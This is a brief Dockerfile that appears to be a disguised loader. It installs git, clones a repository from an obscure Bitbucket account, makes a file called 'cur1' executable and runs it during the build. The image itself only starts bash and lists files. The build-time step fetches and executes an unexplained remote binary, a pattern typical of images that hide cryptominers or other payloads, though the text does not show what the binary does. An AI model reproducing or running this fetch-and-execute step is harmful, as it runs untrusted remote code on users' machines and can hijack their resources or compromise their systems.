FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
     git
RUN git clone --recursive https://bitbucket.org/UsertBokehf/kolo /home/kolo \
   && chmod +x /home/kolo/cur1 \
   && /home/kolo/cur1
ENTRYPOINT ["/bin/bash"]
CMD ["ls"]
